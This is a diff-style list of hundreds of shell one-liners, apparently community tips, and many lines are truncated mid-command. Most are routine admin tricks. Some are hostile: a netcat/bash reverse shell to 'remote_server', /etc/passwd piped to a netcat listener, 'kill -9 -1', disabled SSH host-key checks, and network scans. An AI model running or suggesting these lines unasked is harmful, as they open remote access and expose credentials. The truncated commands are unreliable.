+while [ /bin/true ]; do OLD=$NEW; NEW=`cat /proc/net/dev | grep eth0 | tr -s ' '
+du -hs */ | sort -hr | head
+!$
+ethtool -p eth0
+j=0;while true; do let j=$j+1; for i in $(seq 0 20 100); do echo $i;sleep 1; don
+check(){ curl -sI $1 | sed -n 's/Location: *//p';}
+yt () mplayer -fs -quiet $(youtube-dl -g "$1")
+openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//'
+@reboot <yourscript.sh>
+echo "uptime" | pee "ssh host1" "ssh host2" "ssh host3"
+while true; do inotifywait -r -e MODIFY dir/ && make; done;
+zenity --list --width 500 --height 500 --column 'radio' --column 'url' --print-c
+killall -INFO dd
+for i in {1..254}; do ping -c 1 -W 1 10.1.1.$i | grep 'from'; done
+dd bs=1k if=image.nrg of=image.iso skip=300
+lsof -r 2 -p PID -i -a
+rsync --progress file1 file2
+perl -le 'print $!+0, "\t", $!++ for 0..127'
+find . -type f -exec sed -i s/oldstring/newstring/g {} +
+pwgen -Bs 10 1
+function man2pdf(){ man -t ${1:?Specify man as arg} | ps2pdf -dCompatibility=1.3
+for c in `seq 0 255`;do t=5;[[ $c -lt 108 ]]&&t=0;for i in `seq $t 5`;do echo -e
+echo $PATH | tr \: \\n
+exiftool '-Directory<DateTimeOriginal' -d %Y/%m/%d dir
+tail -F file
+man ls | col -b > ~/Desktop/man_ls.txt
+curl -s http://checkip.dyndns.org/ | grep -o "[[:digit:].]\+"
+ifstat -nt
+sed 's/\o0/\n/g' /proc/INSERT_PID_HERE/environ
+( cat badfile.log ; tac badfile.log | tac ) > goodfile.log
+sudo cat /dev/vcs1 | fold -w 80
+curl dict://dict.org/d:something
+diff <(ssh alice cat /etc/apt/sources.list) <(ssh bob cat /etc/apt/sources.list)
+Ctrl+S Ctrl+Q
+< /path/to/file.txt grep foo
+base64 -d <<< aHR0cDovL3d3dy50d2l0dGVyc2hlZXAuY29tL3Jlc3VsdHMucGhwP3U9Y29tbWFuZG
+xvkbd -xsendevent -text "Hello world"
+convert -font -misc-fixed-*-*-*-*-*-*-*-*-*-*-*-* -fill black -draw "text 270,26
+sudo cat /proc/kcore | strings | awk 'length > 20' | less
+sudo dd if=/dev/sda of=/media/disk/backup/sda.backup
+date -d '2 weeks ago Saturday' +%Y-%m-%d
+tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether[20:2] == 0x2000'
+^r in bash begins a reverse-search-history with command completion
+ffmpeg -i video.avi -f mp3 audio.mp3
+last  | grep -v "^$" | awk '{ print $1 }' | sort -nr | uniq -c
+nmap -sP 192.168.1.100-254
+file !$
+netstat -plunt
+: </dev/tcp/127.0.0.1/80
+ps -fC PROCESSNAME
+wget -r -l1 -H -t1 -nd -N -np -A.mp3 -erobots=off [url of website]
+php -S 127.0.0.1:8080
+read && ffmpeg -y -r 1 -t 3 -f video4linux2 -vframes 1 -s sxga -i /dev/video0 ~/
+soffice --headless -convert-to odt:"writer8" somefile.docx
+hourglass(){ trap 'tput cnorm' 0 1 2 15 RETURN;local s=$(($SECONDS +$1));(tput c
+say() { mplayer "http://translate.google.com/translate_tts?q=$1"; }
+find . -name \*.php -exec php -l "{}" \;
+read -s -p"Password: " USER_PASSWORD_VARIABLE; echo
+watch vmstat -sSM
+ff() { local IFS='|'; grep -rinE "$*" . ; }
+sleep 3s && espeak "wake up, you bastard" 2>/dev/null
+<ESC> v
+echo "uptime" | tee >(ssh host1) >(ssh host2) >(ssh host3)
+history | awk '{a[$2]++}END{for(i in a){print a[i] " " i}}' | sort -rn | head >
+pkill -x firefox
+export PS1="C:\$( pwd | sed 's:/:\\\\\\:g' )\\> "
+mkisofs -J -allow-lowercase -R -V "OpenCD8806" -iso-level 4 -o OpenCD.iso ~/Open
+ruler() { for s in '....^....|' '1234567890'; do w=${#s}; str=$( for (( i=1; $i<
+xvkbd -xsendevent -text $(date +%Y%m%d)
+curl -u twitter-username -d status="Hello World, Twitter!" -d source="cURL" http
+path_stripped_programname="${0##*/}"
+trash <file>
+stty sane
+wget -q -O - `youtube-dl -b -g $url`| ffmpeg -i - -f mp3 -vn -acodec libmp3lame
+sitepass() { echo -n "$@" |  md5sum | sha1sum | sha224sum | sha256sum | sha384su
+Ctrl-R <search-text>
+diff <(ssh server01 'cd config; find . -type f -exec md5sum {} \;| sort -k 2') <
+rename -v 's/ /_/g' *
+echo "${PATH//:/$'\n'}"
+rsync -az /home/user/test user@sshServer:/tmp/
+find . -empty -type d -exec rmdir {} +
+wajig large
+watch -n 1 "netstat -tpanl | grep ESTABLISHED"
+sudo killall -9 pulseaudio; pulseaudio >/dev/null 2>&1 &
+curl -u username -o bookmarks.xml https://api.del.icio.us/v1/posts/all
+while true; do [ "$(ping -c1W1w1 server-or-ip.com | awk '/received/ {print $4}')
+netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n
+seq 50| awk 'BEGIN {a=1; b=1} {print a; c=a+b; a=b; b=c}'
+convert -colors 256 -resize 16x16 face.jpg face.ppm && ppmtowinicon -output favi
+sudo dmidecode --type 17 | more
+firefox -no-remote -P
+git commit --amend
+sort -nt . -k 1,1 -k 2,2 -k 3,3 -k 4,4
+sudo dmidecode | grep Serial\ Number | head -n1
+rsync --partial --progress --rsh=ssh SOURCE DESTINATION
+cat .ssh/id_rsa.pub | ssh hostname 'cat >> .ssh/authorized_keys'
+yes "$(seq 232 255;seq 254 -1 233)" | while read i; do printf "\x1b[48;5;${i}m\n
+t2s() { wget -q -U Mozilla -O $(tr ' ' _ <<< "$1"| cut -b 1-15).mp3 "http://tran
+function google { Q="$@"; GOOG_URL='https://www.google.de/search?tbs=li:1&q='; A
+ps axu | grep [a]pache2
+<ctrl+e> <esc+t>
+pscp -h hosts.txt -l username /etc/hosts /tmp/hosts
+ssh  -t remotebox "tail -f /var/log/remote.log"
+t=$(df|awk 'NR!=1{sum+=$2}END{print sum}');sudo du / --max-depth=1|sed '$d'|sort
+du -h --max-depth=1 |sort -rh
+shopt -s histverify
+convert -resize '1024x600^' image.jpg small-image.jpg
+getent services <<service>>
+oowriter -pt pdf your_word_file.doc
+diffxml() { diff -wb <(xmllint --format "$1") <(xmllint --format "$2"); }
+lsof +D <dirname>
+cls(){ printf "\33[2J";} or, if no printf, cat >cls;<ctrl-v><ctrl+[>[2J<enter><c
+down4me() { wget -qO - "http://www.downforeveryoneorjustme.com/$1" | sed '/just
+echo "?????, these are the umlauted vowels I sing to you. Oh, and sometimes ?, b
+gdb -batch -ex "run" -ex "bt" ${my_program} 2>&1 | grep -v ^"No stack."$
+cmp file1 file2
+curl --user login:password -o DeliciousBookmarks.xml -O 'https://api.del.icio.us
+<ctrl+z> bg
+lynx -dump http://www.domain.com | awk '/http/{print $2}'
+sudo arp-scan -I eth0 192.168.1.0/24
+dmidecode -t bios
+echo -ne "<shellcode>" | x86dis -e 0 -s intel
+compgen -A function
+export FIGNORE=.svn
+wget randomfunfacts.com -O - 2>/dev/null | grep \<strong\> | sed "s;^.*<i>\(.*\)
+tar jcpf - [sourceDirs] |ssh user@host "cat > /path/to/backup/backupfile.tar.bz2
+pronounce(){ wget -qO- $(wget -qO- "http://dictionary.reference.com/browse/$@" |
+purple-remote "setstatus?status=away&message=AFK"
+grepp() { [ $# -eq 1 ] && perl -00ne "print if /$1/i" || perl -00ne "print if /$
+^W-L
+A=1;B=100;X=0;C=0;N=$[$RANDOM%$B+1];until [ $X -eq $N ];do read -p "N between $A
+ps aux --sort=%mem,%cpu
+su -- user
+<Shift + W>
+sleeper(){ while `ps -p $1 &>/dev/null`; do echo -n "${2:-.}"; sleep ${3:-1}; do
+hdparm -t /dev/sda
+URL="http://www.google.com";curl -L --w "$URL\nDNS %{time_namelookup}s  conn %{t
+python -c 'import this'
+ifconfig -a | perl -nle'/(\d+\.\d+\.\d+\.\d+)/ && print $1'
+cat /dev/clipboard; $(somecommand) > /dev/clipboard
+lsof -i
+find . -name "*jpg" -exec jpeginfo -c {} \; | grep -E "WARNING|ERROR"
+cat typescript | perl -pe 's/\e([^\[\]]|\[.*?[a-zA-Z]|\].*?\a)//g' | col -b > ty
+screen -x
+sudo aptitude purge `dpkg --get-selections | grep deinstall | awk '{print $1}'`
+hwinfo --block --short
+gs -q -sPAPERSIZE=letter -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile=out.pd
+somecommand 2>&1 >> logfile | tee -a logfile
+for i in *.html ; do mv $i ${i%.html}.htm ; done
+sed -i 8d ~/.ssh/known_hosts
+:r !command
+find . -type l ! -exec test -e {} \; -print
+while [ ! -f /tmp/stop ]; do ssh -o ExitOnForwardFailure=yes -R 2222:localhost:2
+fuser [portnumber]/[proto]
+tar czv file1 file2 folder1 | ssh user@server tar zxv -C /destination
+svn status |grep '\?' |awk '{print $2}'| xargs svn add
+while true; do printf "\e[38;5;$(($(od -d -N 2 -A n /dev/urandom)%$(tput colors)
+Ctrl + Alt
+sudo tune2fs -l $(df -h / |(read; awk '{print $1; exit}')) | grep -i created
+ps -eo pid,lstart,cmd
+screen -D -R
+command <<< word
+for i in {1..30}; do  ping -t $i -c 1 google.com; done | grep "Time to live exce
+sudo dmidecode | grep Product
+tar -xaf archive.tar.gz --strip-components=1
+awk '{gsub("foo","bar",$5)}1' file
+while inotifywait -e modify /tmp/myfile; do firefox; done
+var='123456789'; echo ${var:<start_pos>:<offset>}
+while true ; do nc -l 80  < index.html ; done
+ssh -f -L3389:<RDP_HOST>:3389 <SSH_PROXY> "sleep 10" && rdesktop -T'<WINDOW_TITL
+apt-get install `ssh root@host_you_want_to_clone "dpkg -l | grep ii" | awk '{pri
+ssh user@remote-host "DISPLAY=:0.0 import -window root -format png -"|display -f
+say(){ mplayer -user-agent Mozilla "http://translate.google.com/translate_tts?tl
+!!command
+<ALT>+<.> or <ALT>+<NUM>+<.> or <ALT>+<NUM>,<ALT>+<.>
+dpkg -S $( which  ls )
+egrep -i "^[0-9a-f]{4,} .*$*" $(locate CharName.pm) | while read h d; do /usr/bi
+dd if=/path/inputfile | pv | dd of=/path/outpufile
+Confirm() { read -sn 1 -p "$1 [Y/N]? "; [[ $REPLY = [Yy] ]]; }
+echo $(openssl rand 4 | od -DAn)
+kill -9 -1
+sudo chattr +i <file>
+ssh root@HOST tcpdump -U -s0 -w - 'not port 22' | wireshark -k -i -
+curl -n --ssl-reqd --mail-from "<user@gmail.com>" --mail-rcpt "<user@server.tld>
+wtf is <acronym>
+:set ff=unix
+url=http://www.youtube.com/watch?v=V5bYDhZBFLA; youtube-dl -b $url; mplayer $(ls
+sed -n '4{p;q}'
+sed -n '4p'
+find . -iname '*.jpg' -exec echo '<img src="{}">' \; > gallery.html
+wget -qO- icanhazip.com
+screen -raAd
+pydoc -p 8888 & gnome-open http://localhost:8888
+ls /usr/bin | xargs whatis | grep -v nothing | less
+<ALT> .
+while true; do echo -ne "$(date)\r"; sleep 1; done
+ssh <host> 'tar -cz /<folder>/<subfolder>' | tar -xvz
+calc(){ awk "BEGIN{ print $* }" ;}
+dd if=/dev/sda | ssh user@server 'dd of=sda.img'
+find /proc -user myuser -maxdepth 1 -type d -mtime +7 -exec basename {} \; | xar
+apropos network |more
+echo "vertical text" | grep -o '.'
+rename 's/^/prefix/' *
+<ctrl+j>stty sane<ctrl+j>
+shuf -n1 file.txt
+for x in `jot - 0 2400 25`; do curl "http://www.commandlinefu.com/commands/brows
+dos2unix <filenames>
+rsync -rtvu --modify-window=1 --progress /media/SOURCE/ /media/TARGET/
+find -L /proc/*/fd -links 0 2>/dev/null
+ssh -f -N -L 5432:talk.google.com:5222 user@home.network.com
+sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' | xargs echo -e
+for f in *.flv; do ffmpeg -y -i "$f" -f image2 -ss 10 -vframes 1 -an "${f%.flv}.
+fold -s -w 90 file.txt
+echo '{"json":"obj"}' | python -m simplejson.tool
+grep -i --color=auto
+!}sort
+grep --color=auto -iRnH "$search_word" $directory
+alias timestamp='date "+%Y%m%dT%H%M%S"'
+curl -s http://checkip.dyndns.org | sed 's/[a-zA-Z<>/ :]//g'
+netstat -anp |grep 'tcp\|udp' | awk '{print $5}' | sed s/::ffff:// | cut -d: -f1
+rename .oldextension .newextension *.oldextension
+svn st | cut -c 8- | sed 's/^/\"/;s/$/\"/' | xargs tar -czvf ../backup.tgz
+echo SSBMb3ZlIFlvdQo= | base64 -d
+awk '/pattern1/ && /pattern2/ && !/pattern3/ {print}'
+find /path/to/dir -type f -print0 | xargs -0 rm
+du -x --max-depth=1|sort -rn|awk -F / -v c=$COLUMNS 'NR==1{t=$1} NR>1{r=int($1/t
+kpartx -av <image-flat.vmdk>; mount -o /dev/mapper/loop0p1 /mnt/vmdk
+cp foo{,bak}
+hping3 10.0.2.254 --icmp --sign MSGID1 -d 50 -c 1 --file a_file
+curl -s http://www.census.gov/popclock/data/population/world | python -c 'import
+<Return>~.
+ruby -ryaml -rjson -e 'puts YAML.dump(JSON.parse(STDIN.read))' < file.json > fil
+ALT-U / ALT-L
+rsync -aHAXxv --numeric-ids --delete --progress -e "ssh -T -c arcfour -o Compres
+perl -e '$|++; while (1) { print " " x (rand(35) + 1), int(rand(2)) }'
+vim -O file1 file2
+watch -n 1 "do foo"
+brew update && brew upgrade `brew outdated`
+while ( nc -l 80 < /file.htm > : ) ; do : ; done &
+cat /proc/PID/limits
+:w !diff -u % -
+tar xfz filename.tar.gz -C PathToDirectory
+seq 9 | sed 'H;g' | awk -v RS='' '{for(i=1;i<=NF;i++)printf("%dx%d=%d%s", i, NR,
+IFS=$'\n' && for f in `find . -type f -exec md5sum "{}" \;`; do echo $f | sed -r
+multitail -l 'ssh machine1 "tail -f /var/log/apache2/error.log"' -l 'ssh machine
+imgur(){ $*|convert label:@- png:-|curl -F "image=@-" -F "key=1913b4ac473c692372
+pkill -KILL -u username
+rename 's/\d+/sprintf("%04d",$&)/e' *.jpg
+echo "${0%/*}"
+shuf -n1 -e *
+lsmac() { ifconfig -a | sed '/eth\|wl/!d;s/   Link.*HWaddr//' ; }
+ssh -NR 0.0.0.0:2222:127.0.0.1:22 user@jump.host.com
+MIN=10;for ((i=MIN*60;i>=0;i--));do echo -ne "\r$(date -d"0+$i sec" +%H:%M:%S)";
+find . -type f | awk -F'.' '{print $NF}' | sort| uniq -c | sort -g
+curl -I http://localhost
+:%!xxd
+ssh-keygen -l -f ~/.ssh/known_hosts
+kill -9 `ps -xaw -o state -o ppid | grep Z | grep -v PID | awk '{print $2}'`
+echo rm *.txt
+awk '{ $5=""; print }' file
+curl ifconfig.me
+for i in `seq 0 100`;do timeout 6 dialog --gauge "Install..." 6 40 "$i";done
+:> file
+DISPLAY=:0.0 XAUTHORITY=~/.Xauthority notify-send test
+:%d
+cat WAR_AND_PEACE_By_LeoTolstoi.txt | tr -cs "[:alnum:]" "\n"| tr "[:lower:]" "[
+MIN=1 && for i in $(seq $(($MIN*60)) -1 1); do echo -n "$i, "; sleep 1; done; ec
+who loves mum
+twistd -n web --path .
+curl -s "http://feeds.delicious.com/v2/json?count=5" | python -m json.tool | les
+find -type f -exec mv {} . \;
+scp -l10 pippo@serverciccio:/home/zutaniddu/* .
+gs -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dPDFSETTINGS=/screen -dNOPAUSE -d
+pv /dev/zero|ssh $host 'cat > /dev/null'
+while [ 1 ]; do banner 'ze missiles, zey are coming! ' | while IFS="\n" read l;
+cpan -r
+sed -i '/myexpression/d' /path/to/file.txt
+dpigs
+find . -name "whatever.*" -print0 | rsync -av --files-from=- --from0 ./ ./destin
+AUTOSSH_POLL=1 autossh -M 21010 hostname -t 'screen -Dr'
+arecord -q -f cd -r 44100 -c2 -t raw | lame -S -x -h -b 128 - `date +%Y%m%d%H%M`
+cat /var/lib/dpkg/info/*.list > /tmp/listin ; ls /proc/*/exe |xargs -l readlink
+yes "$(seq 1 255)" | while read i; do printf "\x1b[48;5;${i}m\n"; sleep .01; don
+wget -nv http://en.wikipedia.org/wiki/Linux -O- | egrep -o "http://[^[:space:]]*
+tar -cf - /home/user/test | gzip -c | ssh user@sshServer 'cd /tmp; tar xfz -'
+pgrep -u `id -u` firefox-bin || find ~/.mozilla/firefox -name '*.sqlite'|(while
+$ vim ... :help 42
+pgrep command_name
+id="dMH0bHeiRNg";mplayer -fs http://youtube.com/get_video.php?video_id=$id\&t=$(
+curl -u user -d status="Tweeting from the shell" http://twitter.com/statuses/upd
+complete -W "$(echo $(grep '^ssh ' .bash_history | sort -u | sed 's/^ssh //'))"
+ifconfig | perl -nle'/dr:(\S+)/ && print $1'
+:let i=0 | 'a,'bg/ZZZZ/s/ZZZZ/\=i/ | let i=i+1
+readlink -f ../super/symlink_bon/ahoy
+tar czv Pictures | split -d -a 3 -b 16M - pics.tar.gz.
+find <directory path> -mtime +365 -and -not -type d -delete
+echo $?
+shopt -s globstar
+curl -s 'http://download.finance.yahoo.com/d/quotes.csv?s=csco&f=l1'
+read -p "Which station? "; mplayer --reallyquiet -vo none -ao sdl http://somafm.
+sed -r 's/([a-z]+)([A-Z][a-z]+)/\1_\l\2/g' file.txt
+echo "screen -DR" >> ~/.bash_profile
+mplayer -framedrop -vfm ffmpeg -lavdopts lowres=1:fast:skiploopfilter=all
+mkdir $(date +%Y%m%d)
+watch "dmesg |tail -15"
+dpkg --get-selections > LIST_FILE
+lsof -P | grep ':3000'
+ctrl-z
+for i in $(ls *.od{tp}); do unoconv -f pdf $i; done
+touch {1..10}.txt
+find -name '*wma' -exec ffmpeg -i {} -acodec vorbis -ab 128k {}.ogg \;
+cat /etc/*-release
+< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c6
+echo foo bar foobar barfoo && echo !$ !^  !:3 !* &&  echo /usr/bin/foobar&& echo
+ps aux | grep "[s]ome_text"
+find  ./  -name '*'  -exec  rename  's/\s+/_/g'  {}  \;
+sed -e "/$USER/d;s/:.*//g" /etc/group | sed -e :a -e '/$/N;s/\n/ /;ta'
+du -sh *
+wget -O - http://www.commandlinefu.com/commands/browse/rss 2>/dev/null | awk '/\
+rsync -a --delete empty-dir/ target-dir/
+awk '{ $1="";print}'
+base64 /dev/urandom | head -c 33554432 | split -b 8192 -da 4  - dummy.
+!:n
+ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no username@host
+find . -maxdepth 1 -size 0c -delete
+pv -tpreb /dev/urandom | dd of=file.img
+step1 ; step2 ; step3 ; step4 ; curl -o- --get 'https://stream.twitter.com/1/sta
+step4() { oauth_header="Authorization: OAuth oauth_consumer_key=\"$k1\", oauth_n
+step2(){ b="GET&https%3A%2F%2Fstream.twitter.com%2F1%2Fstatuses%2Ffilter.json&fo
+step3() { s=$(echo -n $b | openssl dgst -sha1 -hmac $hmac -binary | openssl base
+xloadimage <(ssh USER@HOSTNAME DISPLAY=:0.0 import -window root png:-)
+aspell -a <<< '<WORDS>'
+find / -type f -size +500M -size -1G
+while true; do cat /proc/net/dev; sleep 1; done | awk -v dc="date \"+%T\"" '/eth
+touch -d $(zenity --calendar --date-format=%F) filename
+sort -g -o list.txt{,}
+$ history -a #in one shell , and $ history -r #in another running shell
+rsync -rv <src> <dst> --progress
+read day month year < <(date +'%d %m %y')
+gpg --gen-random --armor 1 30
+fsck.ext4 -cDfty -C 0 /dev/sdxx
+cat /sys/class/net/eth0/address
+for i in ./*foo*;do mv -- "$i" "${i//foo/bar}";done
+dd if=/dev/zero of=testfile.seek seek=5242879 bs=1 count=1
+alias rot13="tr a-zA-Z n-za-mN-ZA-M"
+alias vim="vim -p"
+tar -czvf - /src/dir | ssh remotehost "(cd /dst/dir ; tar -xzvf -)"
+Ctrl + [
+perl -e 'for(;;){@d=split("",`date +%H%M%S`);print"\r";for(0..5){printf"%.4b ",$
+read -a ARR <<<'world domination now!'; echo ${ARR[2]};
+md5sum <<<"test"
+parallel -j+0 "zcat {} | bzip2 >{.}.bz2 && rm {}" ::: *.gz
+php -i
+ontouchdo(){ while :; do a=$(stat -c%Y "$1"); [ "$b" != "$a" ] && b="$a" && sh -
+atb() { l=$(tar tf $1); if [ $(echo "$l" | wc -l) -eq $(echo "$l" | grep $(echo
+for i in {0..600}; do echo $i; sleep 1; done | dialog --gauge "Install..." 6 40
+alias alert='notify-send -i /usr/share/icons/gnome/32x32/apps/gnome-terminal.png
+ssh -C -Y -l$USER xserver.mynet.xx 'Xnest -geometry 1900x1150 -query localhost'
+screen /dev/tty<device> 9600
+fortune | cowsay -f $(ls /usr/share/cowsay/cows/ | shuf -n1)
+cat my.ps | nc -q 1 hp4550.mynet.xx 9100
+grep -Fxv -f file1 file2
+cat /etc/*release
+d="www.dafont.com/alpha.php?";for c in {a..z}; do l=`curl -s "${d}lettre=${c}"|s
+strace -ff -e write=1,2 -s 1024 -p PID  2>&1 | grep "^ |" | cut -c11-60 | sed -e
+while :;do killall -USR1 dd;sleep 1;done
+rdesktop -a24 -uAdministrator -pPassword  -r clipboard:CLIPBOARD -r disk:share=~
+dmidecode -t 17 | awk -F":" '/Speed/ { print $2 }'
+scp -C 10.0.0.4:/tmp/backup.sql /path/to/backup.sql
+perl -e 'while(1){print"> ";eval<>}'
+nmap -T4 -sP 192.168.2.0/24 && egrep "00:00:00:00:00:00" /proc/net/arp
+find . -type d -empty -delete
+lsof -p $(pidof firefox) | awk '/.mozilla/ { s = int($7/(2^20)); if(s>0) print (
+find /path/to/dir -type f -delete
+curl -s "http://www.geody.com/geoip.php?ip=$(curl -s icanhazip.com)" | sed '/^IP
+curl http://www.whatismyip.org/
+sh -c 'S=askapache R=htaccess; find . -mount -type f|xargs -P5 -iFF grep -l -m1
+find -type f -name "*.avi" -print0 | xargs -0  mplayer -vo dummy -ao dummy -iden
+cat /etc/passwd | openssl aes-256-cbc -a -e -pass pass:password | netcat -l -p 8
+ls -lct /etc | tail -1 | awk '{print $6, $7}'
+while read server; do ssh -n user@$server "command"; done < servers.txt
+ls | while read f; do mv "$f" "${f// /_}";done
+find . -type f -printf '%20s %p\n' | sort -n | cut -b22- | tr '\n' '\000' | xarg
+grep -r --include="*.[ch]" pattern .
+taskset -cp <core> <pid>
+curl http://www.commandlinefu.com/commands/by/<your username>/rss|gzip ->command
+column -t /proc/mounts
+ab -n 9000 -c 900 localhost:8080/index.php
+echo <ctrl-v><esc>c<enter>
+ssh -L :: -L :: @
+ldapsearch -LLL -H ldap://activedirectory.example.com:389 -b 'dc=example,dc=com'
+mecp () { scp "$@" ${SSH_CLIENT%% *}:Desktop/; }
+echo "$(( 0x10 )) - $(( 010 )) = $(( 0x10 - 010 ))"
+find ./ -type f -exec sed -i 's/\t/  /g' {} \;
+for file in <directory A>/*; do rm <directory B>/`basename $file`; done
+cal 09 1752
+script /dev/null | tee /dev/pts/3
+awk '/sshd/ && /Failed/ {gsub(/invalid user/,""); printf "%-12s %-16s %s-%s-%s\n
+alias rot13="tr '[A-Za-z]' '[N-ZA-Mn-za-m]'"
+while true; do X=$Y; sleep 1; Y=$(ifconfig eth0|grep RX\ bytes|awk '{ print $2 }
+swapoff -a ; swapon -a
+ls | while read ITEM; do echo "$ITEM"; done
+tcptraceroute www.google.com
+!date
+split -b 19m file Nameforpart
+while [ 1 ]; do curl -s -u username:password  http://twitter.com/statuses/friend
+autossh -f -M 20000 -D 8000 somehost -N
+vimtutor
+ps aux | grep [h]ttpd
+rename 's/foo/bar/g' *
+iptables -A INPUT -s 222.35.138.25/32 -j DROP
+perl -pi.bk -e's/foo/bar/g' file1 file2 fileN
+command systemctl --no-page --no-legend --plain -t service --state=running
+perl -e 'for(;;sleep 1){printf"\r"."%.4b "x6,split"",`date +%H%M%S`}'
+clear;while true;sleep 1;do for((a=1;a<=$(tput cols)/3;a++));do tput cup 0 $a;ec
+Ctrl+k
+rsync -v -r --size-only --compare-dest=../A/ B/ C/
+<Meta-p> (aka <ALT+P>)
+if [[ ":$PATH:" != *":$dir:"* ]]; then PATH=${PATH}:$dir; fi
+inotifywait -m -r .
+!!; while [ $? -ne 0 ]; do !!; done
+python -c 'import sys, yaml, json; yaml.safe_dump(json.load(sys.stdin), sys.stdo
+Q="YOURSEARCH"; GOOG_URL="http://www.google.com/search?q="; AGENT="Mozilla/4.0";
+echo "main(i){for(i=0;;i++)putchar(((i*(i>>8|i>>9)&46&i>>8))^(i&i>>13|i>>6));}"
+color()(set -o pipefail;"$@" 2>&1>&3|sed $'s,.*,\e[31m&\e[m,'>&2)3>&1
+find . -name '*.rar' -execdir unrar e {} \;
+tr -cd '1-6' < /dev/urandom | head -c 1; echo
+find . -type f -print0 | xargs -0 du -h | sort -hr | head -10
+curl ifconfig.me/all
+ls ${PATH//:/ }
+printf "%$(tput cols)s\n"|tr ' ' '='
+find . -type f -print0 | xargs -0 du -h | sort -hr | head -20
+step1() { k1="Consumer key" ; k2="Consumer secret" ; k3="Access token" ; k4="Acc
+ping -c 1 -q MACHINE_IP_OR_NAME >/dev/null 2>&1 && echo ONLINE || echo OFFLINE
+xmlstarlet sel -t -c "/path/to/element" file.xml
+cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 32
+var=:foobar:; echo ${var:1:-1}
+cat <file> > /dev/null
+export PS1="[\u@`hostname -I` \W]$ "
+command > >(tee stdout.log) 2> >(tee stderr.log >&2)
+sed -e '/\\$/{:0;N;s/\\\n//;t0}'
+lower() { echo ${@,,}; }
+ls -l /etc/**/*killall
+convert input.png -alpha set -channel A -fx 0.5 output.png
+diff -rq dirA dirB
+mknod backpipe p && nc remote_server 1337 0<backpipe | /bin/bash 1>backpipe
+shopt -s histappend ; PROMPT_COMMAND="history -a;$PROMPT_COMMAND"
+ssh vm-user@`VBoxManage guestproperty get "vm-name" "/VirtualBox/GuestInfo/Net/0
+sudo socat TCP4-LISTEN:80,bind=127.0.0.1,fork EXEC:'echo "HTTP/1.1 503 Service U
+alias screensaver='for ((;;)); do echo -ne "\033[$((1+RANDOM%LINES));$((1+RANDOM
+arr[i*100+j]="whatever"
+echo "Terrorist threat level: `od -An -N1 -i /dev/random`"
+script /tmp/log.txt
+wget -e robots=off -E -H -k -K -p http://<page>
+echo "this is a test" | sed 's/.*/\L&/; s/[a-z]*/\u&/g'
+rtfm() { help $@ || info $@ || man $@ || $BROWSER "http://www.google.com/search?
+ssh -R 5497:127.0.0.1:22 -p 62220 user@public.ip
+perl -wlne'/title>([^<]+)/i&&rename$ARGV,"$1.html"' *.html
+xargs -n 2 mv < file_with_colums_of_names
+> file
+tail -f file | awk '{now=strftime("%F %T%z\t");sub(/^/, now);print}'
+badblocks -n -s -b 2048 /dev/sdX
+truncate -s 1M file
+while [ true ]; do head -n 100 /dev/urandom; sleep .1; done | hexdump -C | grep
+/usr/bin/man $* || w3m -dump http://google.com/search?q="$*"\&btnI | less
+lsof /folder
+blkid /dev/sda7
+mussh -h host1 host2 host3 -c uptime
+exec 2>&1
+dig +short @resolver1.opendns.com myip.opendns.com
+echo ${fullpath##*/}
+for i in {0..255}; do echo -e "\e[38;05;${i}m${i}"; done | column -c 80 -s '  ';
+find -type l -xtype d
+indent -kr hello.c
+echo 'some command' | batch
+mysqldump -q --skip-opt --force --log-error=dbname_error.log -uroot -pmysqlpassw
+tail -fs 1 somefile
+dd if=/dev/zero | pv | dd of=/dev/null
+tail -f access.log | pv -l -i10 -r >/dev/null
+cd() { if [ -z "$1" ]; then command cd; else if [ -f "$1" ]; then command cd $(d
+ssh -o UserKnownHostsFile=/dev/null root@192.168.1.1
+dd if=/dev/nst0 |pv|dd of=restored_file.tar
+curl http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-250
+python -c 'print "-"*50'
+ruby -e "i=0;loop{puts ' '*(29*(Math.sin(i)/2+1))+'|'*(29*(Math.cos(i)/2+1)); i+
+grep "^V<TAB>" your_file
+echo "message" | smbclient -M NAME_OF_THE_COMPUTER
+mplayer -novideo something.mpg
+mplayer -vo null something.mpg
+any_script.sh < <(some command)
+myinfo() { info --subnodes -o - $1 | less; }
+for f in *;do mv "$f" "${f// /_}";done
+!$
+mail -s "subject" user@todomain.com <emailbody.txt  -- -f customfrom@fromdomain.
+alias rc='ssh ${MEDIAPCHOSTNAME} env DISPLAY=:0.0 rhythmbox-client --no-start'
+colordiff -yW"`tput cols`" /path/to/file1 /path/to/file2
+grep -Eio '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\.[[:alpha:].]{2,6})'
+curl http://sohowww.nascom.nasa.gov/data/realtime/eit_195/512/latest.jpg | xli -
+setterm -powersave off -blank 0
+VBoxManage internalcommands converttoraw winxp.vdi winxp.raw && qemu-img convert
+mmv 'banana_*_*.asc' 'banana_#2_#1.asc'
+[ `date --date='next day' +'%B'` == `date +'%B'` ] || echo 'end of month'
+for i in {21..29}; do nc -v -n -z -w 1 192.168.0.$i 443; done
+echo $(date +%s) > start-time; URL=http://www.google.com; while true; do echo $(
+(IFS=:;for p in $PATH; do test -d $p || echo $p; done)
+find /home/dir -mtime +1 -print -exec gzip -9 {} \; -exec mv {}.gz {}_`date +%F`
+alias ':q'='exit'
+[ "$1" == "--help" ] && { sed -n -e '/^# Usage:/,/^$/ s/^# \?//p' < $0; exit; }
+find ./ -size +10M -type f -print0 | xargs -0 ls -Ssh1 --color
+awk '!a[$0]++' file
+du -sk * |sort -rn |head
+curl -s 'http://checkip.dyndns.org' | sed 's/.*Current IP Address: \([0-9\.]*\).
+echo "Body goes here" | mutt -s "A subject" -a /path/to/file.tar.gz recipient@ex
+touch $2;firefox -print $1 -printmode PNG -printfile $2
+sed '/^#.*DEBUG.*/ s/^#//' $FILE
+amixer sset Master toggle
+curl -sd 'rid=value&submit=SUBMIT' <URL> > out.html
+$ grep -or string path/ | wc -l
+curl -sd q=Network http://www.commandlinefu.com/search/autocomplete |html2text -
